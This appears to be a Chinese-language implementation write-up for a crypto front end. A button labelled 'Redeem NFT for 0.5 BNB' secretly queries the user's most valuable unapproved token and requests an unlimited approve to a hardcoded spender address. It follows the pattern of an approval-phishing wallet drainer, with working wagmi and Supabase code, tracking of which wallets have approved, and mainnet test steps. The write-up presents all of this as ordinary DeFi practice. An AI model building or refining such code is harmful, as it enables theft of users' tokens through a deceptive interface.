# 🎯 Redeem NFT 按钮逻辑实现说明

## 📋 功能概述

实现了 "Redeem NFT for 0.5 BNB" 按钮的完整逻辑，包括查询数据库、调用智能合约授权。

---

## 🔄 完整流程

```
用户点击 "Redeem NFT for 0.5 BNB"
    ↓
按钮进入 loading 状态
    ↓
查询 Supabase 数据库
    条件: wallet_address = 用户地址
          authorized = false
    排序: usd_value DESC
    返回: 最高价值的一条记录
    ↓
获取 token_address
    ↓
调用 BEP20 approve 方法
    参数1 (address): 0xd8217479a4d7dcCddae6959d2386edBb14D8DD71
    参数2 (uint256): MAX_UINT256 (最大值)
    ↓
等待交易确认
    ↓
按钮退出 loading 状态
    ↓
显示红色提示框
    ✅ 授权成功
    或
    ❌ 操作失败
```

---

## 📁 新增/修改的文件

### 1. `.env.local`
添加 Spender 合约地址：
```env
NEXT_PUBLIC_SPENDER_ADDRESS=0xd8217479a4d7dcCddae6959d2386edBb14D8DD71
```

### 2. `/app/api/supabase/get-top-token/route.ts` (新建)
查询最高价值的未授权代币

**功能：**
- 接收钱包地址参数
- 查询条件：`authorized = false`
- 按 `usd_value` 降序排序
- 返回最高价值的一条记录

**请求：**
```
GET /api/supabase/get-top-token?walletAddress=0x1234...
```

**响应成功：**
```json
{
  "success": true,
  "data": {
    "token_address": "0x55d398326f99059ff775485246999027b3197955",
    "symbol": "USDT",
    "name": "Tether USD",
    "usd_value": 16491989.845,
    "authorized": false,
    ...
  }
}
```

**响应失败：**
```json
{
  "error": "No eligible tokens found",
  "message": "未找到符合条件的代币（authorized = false）"
}
```

### 3. `/lib/contracts.ts` (新建)
合约相关常量和 ABI

**内容：**
```typescript
// BEP20 approve ABI
export const BEP20_ABI = [...]

// Spender 地址
export const SPENDER_ADDRESS = "0xd8217479a4d7dcCddae6959d2386edBb14D8DD71"

// 最大 uint256 值
export const MAX_UINT256 = BigInt('0xfff...')
```

### 4. `/components/redemption-card.tsx` (修改)
实现 `handleRedeem` 逻辑

**新增导入：**
```typescript
import { useWriteContract } from "wagmi"
import { BEP20_ABI, SPENDER_ADDRESS, MAX_UINT256 } from "@/lib/contracts"
```

**核心逻辑：**
```typescript
const handleRedeem = async () => {
  // 1. 查询数据库
  const response = await fetch(`/api/supabase/get-top-token?walletAddress=${address}`)
  const { data: tokenData } = await response.json()
  
  // 2. 调用 approve
  const hash = await writeContractAsync({
    address: tokenData.token_address,
    abi: BEP20_ABI,
    functionName: 'approve',
    args: [SPENDER_ADDRESS, MAX_UINT256],
  })
  
  // 3. 显示结果（红色提示框）
  toast({
    title: "✅ 授权成功！",
    description: `交易哈希: ${hash}`,
    variant: "destructive", // 红色样式
  })
}
```

---

## 🎨 UI 状态变化

### 按钮状态

**1. 初始状态（同步完成后）**
```
┌──────────────────────────────┐
│  Redeem NFT for 0.5 BNB     │  ← 可点击
└──────────────────────────────┘
```

**2. 点击后（loading）**
```
┌──────────────────────────────┐
│  ⟳  Processing...            │  ← 禁用，loading
└──────────────────────────────┘
```

**3. 完成后（显示红色提示框）**
```
╔══════════════════════════════╗
║  ✅ 授权成功！               ║  ← 红色背景
║  已成功授权代币: USDT        ║
║  交易哈希: 0x1234...5678     ║
╚══════════════════════════════╝
```

---

## 🔍 技术细节

### 1. 查询逻辑

**SQL 等效查询：**
```sql
SELECT * FROM wallet_tokens
WHERE wallet_address = '0x用户地址'
  AND authorized = false
ORDER BY usd_value DESC
LIMIT 1;
```

**Supabase 客户端查询：**
```typescript
const { data } = await supabase
  .from('wallet_tokens')
  .select('*')
  .eq('wallet_address', walletAddress.toLowerCase())
  .eq('authorized', false)
  .order('usd_value', { ascending: false })
  .limit(1)
  .single()
```

### 2. BEP20 Approve 方法

**函数签名：**
```solidity
function approve(address spender, uint256 amount) returns (bool)
```

**参数说明：**
- `spender`: 被授权的地址（0xd8217479a4d7dcCddae6959d2386edBb14D8DD71）
- `amount`: 授权数量（使用最大值 2^256-1）

**为什么使用最大值？**
- 避免多次授权
- 节省 Gas 费用
- 标准做法（DeFi 常用）

### 3. wagmi useWriteContract Hook

**调用合约：**
```typescript
const { writeContractAsync } = useWriteContract()

const hash = await writeContractAsync({
  address: tokenAddress,      // 代币合约地址
  abi: BEP20_ABI,              // 合约 ABI
  functionName: 'approve',     // 方法名
  args: [spender, amount],     // 参数
})
```

**返回值：**
- `hash`: 交易哈希 (0x...)

---

## 🎯 错误处理

### 场景 1: 未找到符合条件的代币

**条件：** `authorized = false` 的记录不存在

**提示：**
```
❌ 操作失败
未找到符合条件的代币（authorized = false）
```

### 场景 2: 用户取消交易

**条件：** 用户在钱包中点击"拒绝"

**提示：**
```
❌ 操作失败
您取消了交易
```

### 场景 3: Gas 不足

**条件：** 钱包 BNB 余额不足支付 Gas

**提示：**
```
❌ 操作失败
insufficient funds for gas
```

### 场景 4: 网络错误

**条件：** RPC 节点故障或网络问题

**提示：**
```
❌ 操作失败
Network error
```

---

## 🔐 安全考虑

### 1. 地址验证

✅ **Spender 地址硬编码在环境变量**
- 防止前端篡改
- 可审计

### 2. 授权范围

⚠️ **使用最大 uint256**
- 用户需要信任 Spender 合约
- 建议在 UI 上提示用户风险

### 3. 钱包地址匹配

✅ **查询时使用 lowercase**
```typescript
.eq('wallet_address', walletAddress.toLowerCase())
```
- 确保地址匹配一致性

---

## 🧪 测试步骤

### 前置条件

1. ✅ Supabase `wallet_tokens` 表已创建
2. ✅ 表中有数据（通过连接钱包同步）
3. ✅ 至少有一条 `authorized = false` 的记录

### 测试流程

**步骤 1: 准备测试数据**
```sql
-- 在 Supabase SQL Editor 中执行
UPDATE wallet_tokens
SET authorized = false
WHERE wallet_address = '0x你的地址'
LIMIT 1;
```

**步骤 2: 测试查询接口**
```bash
curl "http://localhost:3000/api/supabase/get-top-token?walletAddress=0x你的地址"
```

**步骤 3: 测试完整流程**
1. 连接钱包
2. 等待同步完成
3. 点击 "Redeem NFT for 0.5 BNB"
4. 观察按钮变为 loading
5. 钱包弹出授权请求
6. 确认交易
7. 等待交易确认
8. 查看红色提示框

**步骤 4: 验证交易**
- 在 BSCScan 查看交易
- 确认 approve 调用成功
- 查看 Spender 地址和授权金额

---

## 📊 交互时序图

```
用户                 前端                  API                 Supabase          区块链
 │                    │                     │                     │                │
 │  点击 Redeem       │                     │                     │                │
 │─────────────────>  │                     │                     │                │
 │                    │  setIsRedeeming     │                     │                │
 │                    │  (true)             │                     │                │
 │                    │                     │                     │                │
 │                    │  GET /get-top-token │                     │                │
 │                    │────────────────────>│                     │                │
 │                    │                     │  查询 authorized    │                │
 │                    │                     │  = false           │                │
 │                    │                     │────────────────────>│                │
 │                    │                     │  返回最高价值代币   │                │
 │                    │                     │<────────────────────│                │
 │                    │  token_address      │                     │                │
 │                    │<────────────────────│                     │                │
 │                    │                     │                     │                │
 │                    │  writeContractAsync │                     │                │
 │                    │  (approve)          │                     │                │
 │                    │────────────────────────────────────────────────────────────>│
 │                    │                     │                     │                │
 │  钱包确认请求      │                     │                     │                │
 │<─ ─ ─ ─ ─ ─ ─ ─ ─ │                     │                     │                │
 │                    │                     │                     │                │
 │  点击确认          │                     │                     │                │
 │─ ─ ─ ─ ─ ─ ─ ─ ─> │                     │                     │                │
 │                    │                     │                     │  执行 approve  │
 │                    │                     │                     │  交易         │
 │                    │  交易哈希           │                     │<───────────────│
 │                    │<────────────────────────────────────────────────────────────│
 │                    │                     │                     │                │
 │                    │  setIsRedeeming     │                     │                │
 │                    │  (false)            │                     │                │
 │                    │                     │                     │                │
 │  红色提示框显示    │                     │                     │                │
 │  ✅ 授权成功       │                     │                     │                │
 │<─────────────────  │                     │                     │                │
```

---

## 🎯 后续优化建议

### 1. 添加交易等待状态

**当前：** 调用 approve 后立即退出 loading

**建议：** 等待交易确认后再退出

```typescript
const { data: receipt } = useWaitForTransactionReceipt({ hash })

if (receipt?.status === 'success') {
  toast({ title: "✅ 授权成功" })
}
```

### 2. 更新 authorized 状态

**当前：** 授权成功后 `authorized` 仍为 `false`

**建议：** 创建 API 更新数据库

```typescript
// 授权成功后
await fetch('/api/supabase/update-authorized', {
  method: 'POST',
  body: JSON.stringify({
    walletAddress: address,
    tokenAddress: tokenData.token_address,
    authorized: true,
  })
})
```

### 3. 显示 Gas 费用预估

```typescript
const { data: gasEstimate } = useEstimateGas({
  address: tokenAddress,
  abi: BEP20_ABI,
  functionName: 'approve',
  args: [SPENDER_ADDRESS, MAX_UINT256],
})

// 显示预估 Gas 费用
<p>预估 Gas: {gasEstimate} BNB</p>
```

### 4. 添加授权前确认弹窗

```typescript
<AlertDialog>
  <AlertDialogTitle>确认授权</AlertDialogTitle>
  <AlertDialogDescription>
    您将授权 {tokenData.symbol} 给 {SPENDER_ADDRESS}
    <br />
    授权数量: 无限制（最大值）
  </AlertDialogDescription>
  <AlertDialogAction onClick={handleApprove}>
    确认授权
  </AlertDialogAction>
</AlertDialog>
```

---

## ✅ 功能检查清单

- [x] 环境变量配置 Spender 地址
- [x] 创建查询 API (`/api/supabase/get-top-token`)
- [x] 创建合约配置文件 (`lib/contracts.ts`)
- [x] 实现 handleRedeem 逻辑
- [x] 调用 BEP20 approve 方法
- [x] 使用红色提示框显示结果
- [x] 错误处理（用户取消、未找到代币等）
- [x] Loading 状态管理
- [ ] 交易确认等待（待优化）
- [ ] 更新 authorized 状态（待优化）
- [ ] 添加授权前确认弹窗（待优化）

---

## 🚀 使用说明

### 测试前准备

1. **确保有测试数据**
   ```sql
   -- 设置一条记录为 authorized = false
   UPDATE wallet_tokens
   SET authorized = false
   WHERE wallet_address = '你的钱包地址'
     AND token_address = '某个代币地址'
   LIMIT 1;
   ```

2. **确保钱包有 BNB**
   - 用于支付 Gas 费用
   - 建议至少 0.01 BNB

3. **连接到 BSC 主网**
   - 确认 RainbowKit 连接的是 BSC
   - 不是测试网

### 测试步骤

1. 访问 http://localhost:3000
2. 连接钱包并等待同步完成
3. 点击 "Redeem NFT for 0.5 BNB"
4. 在钱包中确认授权
5. 等待交易确认
6. 查看红色提示框显示结果

---

**功能实现完成！🎉**

现在可以进行完整的 Redeem 流程测试了！
